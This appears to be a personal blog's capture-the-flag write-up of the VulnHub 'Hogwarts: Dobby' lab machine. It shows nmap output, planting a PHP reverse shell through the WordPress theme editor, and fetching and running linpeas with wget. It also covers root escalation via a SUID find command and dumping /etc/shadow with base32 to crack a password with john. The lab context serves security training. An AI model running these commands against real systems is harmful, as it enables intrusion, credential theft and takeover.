---
title: Hogwarts-Dobby - Writeup
author: Elman Alizadeh
date: 2022-05-22 15:30:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, hogwarts, dobby]
---

Today we will take a look at Vulnhub: Dobby. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-hogwarts-dobby/1.jpeg" | relative_url }})

## Network scan

Command: sudo nmap -p- -sV -sC -oN nmap/open — open 192.168.0.105

```console
Nmap scan report for 192.168.0.105
Host is up (0.095s latency).
Not shown: 58603 closed tcp ports (reset), 6931 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==
|_http-server-header: Apache/2.4.46 (Ubuntu)
MAC Address: 3C:A0:67:C5:35:33 (Liteon Technology)
```

## Web

If we look at the source code of the page, we encounter something like this.

```console
Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==
```

Let’s decode with Base64

```console
too easy no? Potte/alohomorar
```

Trap

But below is a hint.

```console
/alohomoraDraco's 

password is his house ;)
```

I searched the internet for the name of the draco’s house.

```console
slytherin
```

## Gobuster

```console
/log                  (Status: 200) [Size: 45]
```

pass:OjppbGlrZXNvY2tz

hint → /DiagonAlley

When we look at the articles here, we see that the author’s name is Draco.

## Reverse shell

Let’s go to the admin panel.

Url: /wp-admin

Go to /wp-admin/theme-editor.php and select 404.php from twenty twenty.

Paste the php reverse shell.

[ReverseShell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

After listening, go to this link

Url: http://192.168.0.105/DiagonAlley/wp-content/themes/twentytwenty/404.php

After logging in

```console
Command: script /dev/null -c bash

Command: export TERM=xterm

ctrl+z

Command: stty raw -echo ; fg

Command: reset
```
## Root 

### Linpeas

[Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
```console
Your machine

Command: python3 -m http.server 80

Target machine

Command: wget http://192.168.0.107/linpeas.sh

Command: chmod +x linpeas.sh

Command: ./linpeas.sh
```
![Desktop View]({{ "/assets/img/vuln-hogwarts-dobby/2.png" | relative_url }})

We found two gaps.

### Vertical Privilege Escalation

Command: /usr/bin/find . -exec /bin/sh -p \; -quit

```console
www-data@HogWarts:/tmp$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
```

### Horizontal Privilege Escalation
```console
Command: LFILE=/etc/shadow

Command: base32 “$LFILE” | base32 — decode
```
We copy the dobby line and paste it into the hash file on our machine

Command: john hash — wordlist=/usr/share/wordlists/rockyou.txt

```console
Created directory: /home/al1z4deh/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilikesocks       (dobby)     
1g 0:00:09:45 DONE (2022-05-22 14:38) 0.001706g/s 1107p/s 1107c/s 1107C/s iloveJESUS..iheartjake
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Command: su dobby

Command: /usr/bin/find . -exec /bin/sh -p \; -quit

![Desktop View]({{ "/assets/img/vuln-hogwarts-dobby/3.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-hogwarts-dobby/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”
